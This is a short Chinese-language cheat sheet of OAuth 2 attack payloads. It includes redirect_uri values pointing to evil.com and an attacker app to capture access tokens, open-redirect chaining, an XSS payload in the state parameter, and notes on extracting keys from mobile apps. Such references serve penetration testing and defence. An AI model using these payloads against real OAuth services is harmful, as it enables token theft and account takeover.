# OAuth 2常见的漏洞

## 通过redirect_uri抓取的OAuth令牌
重定向到受控域以获取访问令牌
```
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向到被接受的开放URL以获取访问令牌
```
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```
OAuth的实现绝不将整个领域列入优良者名单, 只有少数的网址，“redirect_uri”不能指出一个开放的重定向。

 
有时你需要改成一个无效的域来使redirect_uri过滤器通过:
```
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## 通过redirect_uri执行XSS
```
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth密钥泄露
一些Android / iOS应用程序可以被反编译并且OAuth密钥可以访问。

## 违反授权代码规则
```
The client MUST NOT use the authorization code  more than once.  
If an authorization code is used more than once, the authorization server MUST deny the request 
and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.
```

## 感谢
* http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html
* http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html
* http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html
* http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html
